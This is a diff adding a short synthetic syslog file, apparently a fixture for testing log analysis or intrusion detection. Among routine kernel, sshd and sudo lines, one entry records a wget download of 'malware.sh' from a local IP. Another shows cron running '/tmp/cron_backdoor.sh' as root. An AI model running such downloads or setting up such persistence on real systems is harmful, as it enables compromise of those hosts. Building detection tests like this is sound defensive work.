@@ -1,0 +1,5 @@
+Jan  1 00:00:01 testhost kernel: Linux version 5.15.0 (test@build)
+Jan  1 00:00:02 testhost sshd[1234]: Server listening on 0.0.0.0 port 22.
+Jan  1 00:01:00 testhost sudo: root : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash
+Jan  1 00:01:05 testhost bash: user executed: wget http://192.168.1.100/malware.sh
+Jan  1 00:01:10 testhost cron: (root) CMD (/tmp/cron_backdoor.sh)
